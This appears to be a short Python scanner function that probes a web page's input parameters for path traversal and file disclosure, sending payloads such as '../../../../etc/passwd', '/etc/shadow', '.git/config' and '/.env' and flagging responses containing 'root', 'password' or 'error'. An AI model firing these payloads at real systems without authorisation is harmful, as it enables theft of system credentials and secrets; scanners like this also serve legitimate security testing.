# sensitive_info_disclosure.py
def test_sensitive_info_disclosure(url, input_fields):
    print(f"Testing for Sensitive Information Disclosure on {url}")
    vulnerable_params = []
    for field in input_fields:
        name = field[2]
        for payload in ["../../../../etc/passwd", "../../../../etc/shadow", "../../../.git/config", "/etc/hosts", "/.env", "/config.php"]:
            test_url = f"{url}?{name}={payload}"
            response = requests.get(test_url)
            if "root" in response.text or "password" in response.text or "error" in response.text:
                print(f"Potential Sensitive Information Disclosure vulnerability detected in parameter: {name} with payload: {payload}")
                vulnerable_params.append((name, payload))
    return vulnerable_params
